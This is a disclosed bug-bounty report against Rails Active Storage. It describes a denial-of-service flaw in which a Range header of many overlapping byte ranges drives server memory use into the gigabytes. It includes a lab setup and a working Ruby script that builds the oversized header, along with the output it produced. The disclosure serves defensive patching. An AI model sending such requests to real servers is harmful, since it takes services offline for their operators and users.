# DoS with crafted "Range" header

## Report Details
- **Report ID**: 2307813
- **URL**: https://hackerone.com/reports/2307813
- **State**: Closed
- **Severity**: high
- **Submitted**: 2024-01-08T14:54:36.153Z
- **Disclosed**: 2024-06-25T09:29:59.053Z

## Reporter
- **Username**: ooooooo_q
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rails

## Vulnerability Information
I have crafted a request header for "range" against proxy url in Active Storage and confirmed that it will be a DoS.

https://github.com/rails/rails/blob/v7.1.2/activestorage/app/controllers/active_storage/blobs/proxy_controller.rb#L14

```ruby
  def show
    if request.headers["Range"].present?
      send_blob_byte_range_data @blob, request.headers["Range"]
```      

https://github.com/rails/rails/blob/v7.1.2/activestorage/app/controllers/concerns/active_storage/streaming.rb#L14

```ruby
    def send_blob_byte_range_data(blob, range_header, disposition: nil)
      ranges = Rack::Utils.get_byte_ranges(range_header, blob.byte_size)
```

The `Range` object returned by [Rack::Utils.get_byte_ranges](https://github.com/rack/rack/blob/v3.0.8/lib/rack/utils.rb#L435) will never exceed the file size, but there is no restriction on overlapping ranges.

```ruby
❯ bundle exec rails c
Loading development environment (Rails 7.1.2)
irb(main):001> Rack::Utils.get_byte_ranges("bytes=20-40", 200)
=> [20..40]
irb(main):002> Rack::Utils.get_byte_ranges("bytes=20-200,0-200,0-200,-200,-200,", 200)
=> [20..199, 0..199, 0..199, 0..199, 0..199]
```

## PoC

```
❯ ruby -v
ruby 3.2.2 (2023-03-30 revision e51014f9c0) [arm64-darwin22]

❯ rails new range_dos -G -M -C -A -J -T 
=>  Rails 7.1.2, Rack 3.0.8

❯ cd range_dos

❯ bin/rails active_storage:install

❯ bin/rails generate model User avatar:attachment 

❯ bin/rails db:migrate   
```

`config/routes.rb`

```ruby
Rails.application.routes.draw do
  resources :users
  get "up" => "rails/health#show", as: :rails_health_check
end
```

`app/controllers/users_controller.rb`

```ruby
class UsersController < ApplicationController

  def new
    @user = User.new
  end

  def create
    user = User.create!(user_params)
    redirect_to "/users/#{user.id}"
  end

  def show
    @user = User.find(params[:id])
  end

  private
    def user_params
      params.require(:user).permit(:avatar)
    end
end
```

`app/views/users/new.html.erb`

```html
<%= form_with model: @user, local: true, :url => {:action => :create}  do |form| %>
  <%= form.file_field :avatar %><br>
  <%= form.submit %>
<% end %>
```

`app/views/users/show.html.erb`

```html
<% if @user.avatar.attached? %>
  <%= image_tag rails_storage_proxy_path(@user.avatar) %>
<% end %>
```

start server

```
# Comment out `config.force_ssl = true` in production.rb
❯ RAILS_ENV=production bundle exec rails s
```

After uploading the file on the `http://0.0.0.0:3000/users/new` screen, copy the proxy url that appears on the screen.
Sends the request using a crafted header for the url.

`range_request.rb`

```ruby
require 'net/http'

# set proxy url
url = URI.parse('http://0.0.0.0:3000/rails/active_storage/blobs/proxy/...')

req = Net::HTTP::Get.new(url.path)

# length = 8000 # Bad request

length = (80 * 1024 - "bytes=".bytesize) /  "-999999999,".bytesize
puts length 

req["Range"] = "bytes=" + "-999999999," * length 

res = Net::HTTP.start(url.host, url.port) {|http|
  http.request(req)
}

puts res.message
puts res.body.bytesize
```

```
❯ ruby range_request.rb
7446
Partial Content
410058706
```

If the target file is about 50 KB, each request will increase memory usage by several hundred MB.
If the file is nearly 1 MB, more than 10 GB of memory was used on the server side.

## Impact

When accessing the url of proxy, it is possible to put a load on the server's memory usage, etc., by repeatedly writing values in the `Range` request header. Even if the attacker stops the request midway through, the server continues to prepare data, making the attack more efficient.

The same problem exists with [Rack::Files](https://github.com/rack/rack/blob/main/lib/rack/files.rb#L85), but the problem is more serious with Active Stroage, which deals with files uploaded by users.

Additionally, when using nginx, the header length is limited to 8KB, which reduces the impact of the attack. 80KB is set in unicorn and puma.

## Attachments
No attachments
